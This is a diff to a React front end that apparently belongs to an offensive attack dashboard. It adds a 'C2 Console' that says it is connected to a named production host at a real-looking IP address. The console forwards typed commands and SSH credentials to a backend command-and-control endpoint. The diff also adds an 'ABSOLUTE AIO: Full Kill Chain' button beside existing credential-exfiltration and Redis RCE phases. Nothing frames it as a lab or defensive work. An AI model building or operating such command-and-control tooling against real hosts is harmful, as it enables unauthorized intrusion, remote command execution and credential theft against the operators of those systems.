@@ -79,7 +79,15 @@ export default function App() {
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
   const [confirmAction, setConfirmAction] = useState<{ phase: string; label: string } | null>(null);
   const [errorStatus, setErrorStatus] = useState<string | null>(null);
+  const [c2History, setC2History] = useState<{ type: 'cmd' | 'out'; text: string }[]>([
+    { type: 'out', text: 'RHAE C2 Terminal v2.0.0' },
+    { type: 'out', text: 'Connection established to runehall-prod-01 (151.0.214.242)' },
+    { type: 'out', text: 'Type "help" for available commands.' }
+  ]);
+  const [c2Input, setC2Input] = useState("");
+  const [sshSession, setSshSession] = useState<{ host: string; user: string; pass: string } | null>(null);
   const logEndRef = useRef<HTMLDivElement>(null);
+  const c2EndRef = useRef<HTMLDivElement>(null);
 
   const fetchLogs = async () => {
     try {
@@ -116,9 +124,13 @@ export default function App() {
     logEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [logs]);
 
+  useEffect(() => {
+    c2EndRef.current?.scrollIntoView({ behavior: "smooth" });
+  }, [c2History]);
+
   const runPhase = async (phase: string) => {
     // Phases that require confirmation
-    const sensitivePhases = ["phase4", "phase7", "resilience-test", "vuln-scan", "grafana-scan", "redis-rce"];
+    const sensitivePhases = ["phase4", "phase7", "resilience-test", "vuln-scan", "grafana-scan", "redis-rce", "absolute-aio"];
     if (sensitivePhases.includes(phase) && !confirmAction) {
       const labels: Record<string, string> = {
         "phase4": "Execute Exploitation Payloads",
@@ -126,7 +138,8 @@ export default function App() {
         "resilience-test": "Run Advanced Resilience Test",
         "vuln-scan": "Initiate Vulnerability Scan",
         "grafana-scan": "Initiate Grafana Credential Exfiltration",
-        "redis-rce": "Execute Redis RCE Exploitation"
+        "redis-rce": "Execute Redis RCE Exploitation",
+        "absolute-aio": "Initiate ABSOLUTE AIO: Full Kill Chain"
       };
       setConfirmAction({ phase, label: labels[phase] || phase });
       return;
@@ -158,6 +171,77 @@ export default function App() {
     await fetch("/api/reset", { method: "POST" });
     setLogs([]);
     setLoot(null);
+    setC2History([
+      { type: 'out', text: 'RHAE C2 Terminal v2.0.0' },
+      { type: 'out', text: 'Connection established to runehall-prod-01 (151.0.214.242)' },
+      { type: 'out', text: 'Type "help" for available commands.' }
+    ]);
+  };
+
+  const handleC2Submit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!c2Input.trim()) return;
+
+    const cmd = c2Input.trim();
+    setC2History(prev => [...prev, { type: 'cmd', text: cmd }]);
+    setC2Input("");
+
+    if (cmd.toLowerCase() === "clear") {
+      setC2History([]);
+      return;
+    }
+
+    if (cmd.toLowerCase() === "exit" && sshSession) {
+      setSshSession(null);
+      setC2History(prev => [...prev, { type: 'out', text: `Connection to ${sshSession.host} closed.` }]);
+      return;
+    }
+
+    // Parse SSH command: ssh user:pass@host
+    if (cmd.toLowerCase().startsWith("ssh ") && !sshSession) {
+      const parts = cmd.split(" ");
+      if (parts.length === 2) {
+        const connectionStr = parts[1]; // user:pass@host
+        const atIndex = connectionStr.indexOf("@");
+        const colonIndex = connectionStr.indexOf(":");
+        
+        if (atIndex !== -1 && colonIndex !== -1 && colonIndex < atIndex) {
+          const user = connectionStr.substring(0, colonIndex);
+          const pass = connectionStr.substring(colonIndex + 1, atIndex);
+          const host = connectionStr.substring(atIndex + 1);
+          
+          setSshSession({ host, user, pass });
+          setC2History(prev => [...prev, { type: 'out', text: `Establishing SSH connection to ${host} as ${user}...` }]);
+          setC2History(prev => [...prev, { type: 'out', text: `Connected to ${host}.` }]);
+          return;
+        }
+      }
+      setC2History(prev => [...prev, { type: 'out', text: 'Usage: ssh user:password@host' }]);
+      return;
+    }
+
+    try {
+      const body: any = { command: cmd };
+      if (sshSession) {
+        body.sshConfig = {
+          host: sshSession.host,
+          username: sshSession.user,
+          password: sshSession.pass
+        };
+      }
+
+      const res = await fetch("/api/c2/command", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body)
+      });
+      const data = await res.json();
+      if (data.output) {
+        setC2History(prev => [...prev, { type: 'out', text: data.output }]);
+      }
+    } catch (e) {
+      setC2History(prev => [...prev, { type: 'out', text: 'Error: Failed to communicate with C2 server.' }]);
+    }
   };
 
   const renderDashboard = () => (
@@ -268,6 +352,13 @@ export default function App() {
             onClick={() => runPhase("redis-rce")} 
             disabled={isRunning} 
             className="border-red-500/50 text-red-400 hover:bg-red-500/10"
+          />
+          <ActionButton 
+            label="ABSOLUTE AIO" 
+            icon={<Activity size={16} />} 
+            onClick={() => runPhase("absolute-aio")} 
+            disabled={isRunning} 
+            className="border-red-600 text-red-500 hover:bg-red-600/10 font-bold"
           />
           <button 
             onClick={resetSystem}
@@ -472,11 +563,58 @@ export default function App() {
     </div>
   );
 
+  const renderC2Console = () => (
+    <div className="p-6 h-full flex flex-col">
+      <div className="bg-zinc-950 border border-zinc-800 rounded-lg flex-1 flex flex-col overflow-hidden shadow-2xl">
+        <div className="bg-zinc-900 px-4 py-2 border-b border-zinc-800 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <div className="w-3 h-3 rounded-full bg-red-500/20 border border-red-500/50" />
+            <span className="text-[10px] font-mono text-zinc-400 uppercase tracking-widest">Live C2 Session: runehall-prod-01</span>
+          </div>
+          <span className="text-[9px] font-mono text-zinc-600">CONNECTED via HTTPS/REST</span>
+        </div>
+        
+        <div className="flex-1 p-4 font-mono text-xs overflow-y-auto scrollbar-hide space-y-2">
+          {c2History.map((item, i) => (
+            <div key={i} className={item.type === 'cmd' ? "text-orange-500" : "text-zinc-300 whitespace-pre-wrap"}>
+              {item.type === 'cmd' ? (
+                <div className="flex gap-2">
+                  <span className="text-zinc-600">
+                    {sshSession ? `${sshSession.user}@${sshSession.host}` : 'www-data@runehall'}:~$
+                  </span>
+                  <span>{item.text}</span>
+                </div>
+              ) : (
+                <div>{item.text}</div>
+              )}
+            </div>
+          ))}
+          <div ref={c2EndRef} />
+        </div>
+
+        <form onSubmit={handleC2Submit} className="p-4 bg-zinc-900/50 border-t border-zinc-800 flex gap-2">
+          <span className="text-zinc-600 font-mono text-xs self-center">
+            {sshSession ? `${sshSession.user}@${sshSession.host}` : 'www-data@runehall'}:~$
+          </span>
+          <input 
+            type="text" 
+            value={c2Input}
+            onChange={(e) => setC2Input(e.target.value)}
+            className="flex-1 bg-transparent border-none outline-none text-zinc-100 font-mono text-xs"
+            autoFocus
+            placeholder={sshSession ? "Execute remote command..." : "Enter command (or ssh user:pass@host)..."}
+          />
+        </form>
+      </div>
+    </div>
+  );
+
   const renderContent = () => {
     switch (activeTab) {
       case "dashboard": return renderDashboard();
       case "loot": return renderLoot();
       case "intel": return renderIntelligence();
+      case "c2": return renderC2Console();
       default: return renderDashboard();
     }
   };
@@ -530,6 +668,12 @@ export default function App() {
             icon={<Database size={18} />} 
             label="Loot & Findings" 
           />
+          <SidebarItem 
+            active={activeTab === "c2"} 
+            onClick={() => setActiveTab("c2")} 
+            icon={<Terminal size={18} />} 
+            label="C2 Console" 
+          />
           <div className="pt-4 mt-4 border-t border-zinc-800">
             <h4 className="text-[10px] font-mono text-zinc-600 uppercase tracking-widest px-3 mb-2">Target Info</h4>
             <div className="px-3 py-2 bg-zinc-900/50 rounded border border-zinc-800">
@@ -579,6 +723,12 @@ export default function App() {
                     onClick={() => { setActiveTab("loot"); setIsMobileMenuOpen(false); }} 
                     icon={<Database size={20} />} 
                     label="Loot & Findings" 
+                  />
+                  <SidebarItem 
+                    active={activeTab === "c2"} 
+                    onClick={() => { setActiveTab("c2"); setIsMobileMenuOpen(false); }} 
+                    icon={<Terminal size={20} />} 
+                    label="C2 Console" 
                   />
                 </div>
                 <div className="absolute bottom-8 left-6 right-6 pt-6 border-t border-zinc-800">
@@ -662,6 +812,12 @@ export default function App() {
           onClick={() => setActiveTab("loot")} 
           icon={<Database size={20} />} 
           label="Loot" 
+        />
+        <MobileNavItem 
+          active={activeTab === "c2"} 
+          onClick={() => setActiveTab("c2")} 
+          icon={<Terminal size={20} />} 
+          label="C2" 
         />
       </div>
 
